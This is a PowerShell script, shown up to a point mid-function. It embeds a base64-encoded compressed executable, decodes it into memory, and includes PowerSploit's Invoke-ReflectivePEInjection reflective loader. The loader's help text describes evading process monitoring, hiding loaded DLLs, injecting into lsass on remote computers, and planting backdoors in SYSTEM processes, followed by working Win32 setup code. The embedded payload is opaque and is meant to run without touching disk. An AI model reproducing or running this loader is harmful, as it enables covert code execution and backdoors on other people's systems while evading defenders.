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
FAoBAF/OAkO7gNsBFQYBACCA/YEAAA==
'
#https://superuser.com/questions/1506991/download-and-extract-archive-using-powershell
#[System.Reflection.Assembly]::LoadWithPartialName('System.IO.Compression')
#    $result=Invoke-WebRequest -Uri 'https://ffmpeg.zeranoe.com/builds/win64/static/ffmpeg-20200424-a501947-win64-static.zip' -Method Get -SslProtocol Tls12
#
#    $result = [System.Convert]::FromBase64String($CompressedString)

#    $zipStream = New-Object System.IO.Memorystream
#    $zipStream.Write($result,0,$result.Length)
#    $zipFile = [System.IO.Compression.ZipArchive]::new($zipStream)
#    OK, what did I just download?
#    Write the contents to the shell output
#    $zipFile.Entries | Select-Object -ExcludeProperty @('Archive','ExternalAttributes') | Format-Table #I don't care about 'Archive' or 'ExternalAttributes', so I instruct suppress those
#    I see there is 'ffmpeg-20200424-a501947-win64-static/bin/ffmpeg.exe' entry
#    $zipEntry = $zipFile.GetEntry('doom2/gzdoom.exe')
#    $binReader = [System.IO.BinaryReader]::new($zipEntry.Open())
#    $PEBytes= $binReader.ReadBytes($zipEntry.Length)
#    need external modules `PowerShellMafia/PowerSploit` to be able to run exe from memory (without writing to disk); see comments below this code block
#    Invoke-ReflectivePEInjection -PEBytes $binReader.ReadByte() -ExeArgs "Arg1 Arg2 Arg3 Arg4"


Add-Type -path $env:systemroot\system32\WindowsPowerShell\v1.0\SevenZipExtractor.dll

$result = [System.Convert]::FromBase64String($CompressedString)

$zipStream = [System.IO.MemoryStream]::new(($result))
$szExtractor = New-Object -TypeName SevenZipExtractor.ArchiveFile -ArgumentList @($zipStream, 'sevenzip')

foreach ($entry in $szExtractor.Entries) {
    $memStream = [System.IO.MemoryStream]::new()

    $entry.Extract($memStream);
    $PEBytes=  $memstream.ToArray()
}

#    $szExtractor.Extract("$env:TEMP",$False) # Instead of $env:TEMP, wherever you want the files to go


#PSGzip decompression
#$data = [System.Convert]::FromBase64String($CompressedString)
#$ms = New-Object System.IO.MemoryStream
#$ms.Write($data, 0, $data.Length)
#$ms.Seek(0,0) | Out-Null
#$sr = New-Object System.IO.StreamReader(New-Object System.IO.Compression.GZipStream($ms, [System.IO.Compression.CompressionMode]::Decompress))
#$InputString = $sr.ReadToEnd()

function Invoke-ReflectivePEInjection
{
<#
.SYNOPSIS

This script has two modes. It can reflectively load a DLL/EXE in to the PowerShell process,
or it can reflectively load a DLL in to a remote process. These modes have different parameters and constraints,
please lead the Notes section (GENERAL NOTES) for information on how to use them.

1.)Reflectively loads a DLL or EXE in to memory of the Powershell process.
Because the DLL/EXE is loaded reflectively, it is not displayed when tools are used to list the DLLs of a running process.

This tool can be run on remote servers by supplying a local Windows PE file (DLL/EXE) to load in to memory on the remote system,
this will load and execute the DLL/EXE in to memory without writing any files to disk.

2.) Reflectively load a DLL in to memory of a remote process.
As mentioned above, the DLL being reflectively loaded won't be displayed when tools are used to list DLLs of the running remote process.

This is probably most useful for injecting backdoors in SYSTEM processes in Session0. Currently, you cannot retrieve output
from the DLL. The script doesn't wait for the DLL to complete execution, and doesn't make any effort to cleanup memory in the
remote process.

PowerSploit Function: Invoke-ReflectivePEInjection
Author: Joe Bialek, Twitter: @JosephBialek
Code review and modifications: Matt Graeber, Twitter: @mattifestation
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None

.DESCRIPTION

Reflectively loads a Windows PE file (DLL/EXE) in to the powershell process, or reflectively injects a DLL in to a remote process.

.PARAMETER PEBytes

A byte array containing a DLL/EXE to load and execute.

.PARAMETER ComputerName

Optional, an array of computernames to run the script on.

.PARAMETER FuncReturnType

Optional, the return type of the function being called in the DLL. Default: Void
    Options: String, WString, Void. See notes for more information.
    IMPORTANT: For DLLs being loaded remotely, only Void is supported.
    
.PARAMETER ExeArgs

Optional, arguments to pass to the executable being reflectively loaded.
    
.PARAMETER ProcName

Optional, the name of the remote process to inject the DLL in to. If not injecting in to remote process, ignore this.

.PARAMETER ProcId

Optional, the process ID of the remote process to inject the DLL in to. If not injecting in to remote process, ignore this.

.PARAMETER ForceASLR

Optional, will force the use of ASLR on the PE being loaded even if the PE indicates it doesn't support ASLR. Some PE's will work with ASLR even
    if the compiler flags don't indicate they support it. Other PE's will simply crash. Make sure to test this prior to using. Has no effect when
    loading in to a remote process.

.PARAMETER DoNotZeroMZ

Optional, will not wipe the MZ from the first two bytes of the PE. This is to be used primarily for testing purposes and to enable loading the same PE with Invoke-ReflectivePEInjection more than once.
    
.EXAMPLE

Load DemoDLL and run the exported function WStringFunc on Target.local, print the wchar_t* returned by WStringFunc().
$PEBytes = [IO.File]::ReadAllBytes('DemoDLL.dll')
Invoke-ReflectivePEInjection -PEBytes $PEBytes -FuncReturnType WString -ComputerName Target.local

.EXAMPLE

Load DemoDLL and run the exported function WStringFunc on all computers in the file targetlist.txt. Print
    the wchar_t* returned by WStringFunc() from all the computers.
$PEBytes = [IO.File]::ReadAllBytes('DemoDLL.dll')
Invoke-ReflectivePEInjection -PEBytes $PEBytes -FuncReturnType WString -ComputerName (Get-Content targetlist.txt)

.EXAMPLE

Load DemoEXE and run it locally.
$PEBytes = [IO.File]::ReadAllBytes('DemoEXE.exe')
Invoke-ReflectivePEInjection -PEBytes $PEBytes -ExeArgs "Arg1 Arg2 Arg3 Arg4"

.EXAMPLE

Load DemoEXE and run it locally. Forces ASLR on for the EXE.
$PEBytes = [IO.File]::ReadAllBytes('DemoEXE.exe')
Invoke-ReflectivePEInjection -PEBytes $PEBytes -ExeArgs "Arg1 Arg2 Arg3 Arg4" -ForceASLR

.EXAMPLE

Refectively load DemoDLL_RemoteProcess.dll in to the lsass process on a remote computer.
$PEBytes = [IO.File]::ReadAllBytes('DemoDLL_RemoteProcess.dll')
Invoke-ReflectivePEInjection -PEBytes $PEBytes -ProcName lsass -ComputerName Target.Local

.NOTES
GENERAL NOTES:
The script has 3 basic sets of functionality:
1.) Reflectively load a DLL in to the PowerShell process
    -Can return DLL output to user when run remotely or locally.
    -Cleans up memory in the PS process once the DLL finishes executing.
    -Great for running pentest tools on remote computers without triggering process monitoring alerts.
    -By default, takes 3 function names, see below (DLL LOADING NOTES) for more info.
2.) Reflectively load an EXE in to the PowerShell process.
    -Can NOT return EXE output to user when run remotely. If remote output is needed, you must use a DLL. CAN return EXE output if run locally.
    -Cleans up memory in the PS process once the DLL finishes executing.
    -Great for running existing pentest tools which are EXE's without triggering process monitoring alerts.
3.) Reflectively inject a DLL in to a remote process.
    -Can NOT return DLL output to the user when run remotely OR locally.
    -Does NOT clean up memory in the remote process if/when DLL finishes execution.
    -Great for planting backdoor on a system by injecting backdoor DLL in to another processes memory.
    -Expects the DLL to have this function: void VoidFunc(). This is the function that will be called after the DLL is loaded.

DLL LOADING NOTES:

PowerShell does not capture an applications output if it is output using stdout, which is how Windows console apps output.
If you need to get back the output from the PE file you are loading on remote computers, you must compile the PE file as a DLL, and have the DLL
return a char* or wchar_t*, which PowerShell can take and read the output from. Anything output from stdout which is run using powershell
remoting will not be returned to you. If you just run the PowerShell script locally, you WILL be able to see the stdout output from
applications because it will just appear in the console window. The limitation only applies when using PowerShell remoting.

For DLL Loading:
Once this script loads the DLL, it calls a function in the DLL. There is a section near the bottom labeled "YOUR CODE GOES HERE"
I recommend your DLL take no parameters. I have prewritten code to handle functions which take no parameters are return
the following types: char*, wchar_t*, and void. If the function returns char* or wchar_t* the script will output the
returned data. The FuncReturnType parameter can be used to specify which return type to use. The mapping is as follows:
wchar_t* : FuncReturnType = WString
char* : FuncReturnType = String
void : Default, don't supply a FuncReturnType

For the whcar_t* and char_t* options to work, you must allocate the string to the heap. Don't simply convert a string
using string.c_str() because it will be allocaed on the stack and be destroyed when the DLL returns.

The function name expected in the DLL for the prewritten FuncReturnType's is as follows:
WString : WStringFunc
String : StringFunc
Void : VoidFunc

These function names ARE case sensitive. To create an exported DLL function for the wstring type, the function would
be declared as follows:
extern "C" __declspec( dllexport ) wchar_t* WStringFunc()


If you want to use a DLL which returns a different data type, or which takes parameters, you will need to modify
this script to accomodate this. You can find the code to modify in the section labeled "YOUR CODE GOES HERE".

Find a DemoDLL at: https://github.com/clymb3r/PowerShell/tree/master/Invoke-ReflectiveDllInjection

.LINK

http://clymb3r.wordpress.com/2013/04/06/reflective-dll-injection-with-powershell/

Blog on modifying mimikatz for reflective loading: http://clymb3r.wordpress.com/2013/04/09/modifying-mimikatz-to-be-loaded-using-invoke-reflectivedllinjection-ps1/
Blog on using this script as a backdoor with SQL server: http://www.casaba.com/blog/
#>

[CmdletBinding()]
Param(
    [Parameter(Position = 0, Mandatory = $true)]
    [ValidateNotNullOrEmpty()]
    [Byte[]]
    $PEBytes,
    
    [Parameter(Position = 1)]
    [String[]]
    $ComputerName,
    
    [Parameter(Position = 2)]
    [ValidateSet( 'WString', 'String', 'Void' )]
    [String]
    $FuncReturnType = 'Void',
    
    [Parameter(Position = 3)]
    [String]
    $ExeArgs,
    
    [Parameter(Position = 4)]
    [Int32]
    $ProcId,
    
    [Parameter(Position = 5)]
    [String]
    $ProcName,

    [Switch]
    $ForceASLR,

    [Switch]
    $DoNotZeroMZ
)

Set-StrictMode -Version 2


$RemoteScriptBlock = {
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Byte[]]
        $PEBytes,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [String]
        $FuncReturnType,
                
        [Parameter(Position = 2, Mandatory = $true)]
        [Int32]
        $ProcId,
        
        [Parameter(Position = 3, Mandatory = $true)]
        [String]
        $ProcName,

        [Parameter(Position = 4, Mandatory = $true)]
        [Bool]
        $ForceASLR
    )
    
    ###################################
    ########## Win32 Stuff ##########
    ###################################
    Function Get-Win32Types
    {
        $Win32Types = New-Object System.Object

        #Define all the structures/enums that will be used
        # This article shows you how to do this with reflection: http://www.exploit-monday.com/2012/07/structs-and-enums-using-reflection.html
        $Domain = [AppDomain]::CurrentDomain
        $DynamicAssembly = New-Object System.Reflection.AssemblyName('DynamicAssembly')
        ################################################################################################
        #                              ADAPTED TO PS7	                                               #
        ################################################################################################
        $AssemblyBuilder = [System.Reflection.Emit.AssemblyBuilder]::DefineDynamicAssembly($DynamicAssembly, 'Run')
        # $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynamicAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
        if([System.Convert]::ToDecimal( $PSVersionTable.PSVersion.Minor) -lt 3) {
        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('DynamicModule', $false) }
        else { $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('DynamicModule') }
        ################################################################################################
        #                              END ADAPTED TO PS7	                                           #
        ################################################################################################
        $ConstructorInfo = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]


        ############ ENUM ############
        #Enum MachineType
        $TypeBuilder = $ModuleBuilder.DefineEnum('MachineType', 'Public', [UInt16])
        $TypeBuilder.DefineLiteral('Native', [UInt16] 0) | Out-Null
        $TypeBuilder.DefineLiteral('I386', [UInt16] 0x014c) | Out-Null
        $TypeBuilder.DefineLiteral('Itanium', [UInt16] 0x0200) | Out-Null
        $TypeBuilder.DefineLiteral('x64', [UInt16] 0x8664) | Out-Null
        $MachineType = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name MachineType -Value $MachineType

        #Enum MagicType
        $TypeBuilder = $ModuleBuilder.DefineEnum('MagicType', 'Public', [UInt16])
        $TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR32_MAGIC', [UInt16] 0x10b) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR64_MAGIC', [UInt16] 0x20b) | Out-Null
        $MagicType = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name MagicType -Value $MagicType

        #Enum SubSystemType
        $TypeBuilder = $ModuleBuilder.DefineEnum('SubSystemType', 'Public', [UInt16])
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_UNKNOWN', [UInt16] 0) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_NATIVE', [UInt16] 1) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_GUI', [UInt16] 2) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CUI', [UInt16] 3) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_POSIX_CUI', [UInt16] 7) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CE_GUI', [UInt16] 9) | Out-Null
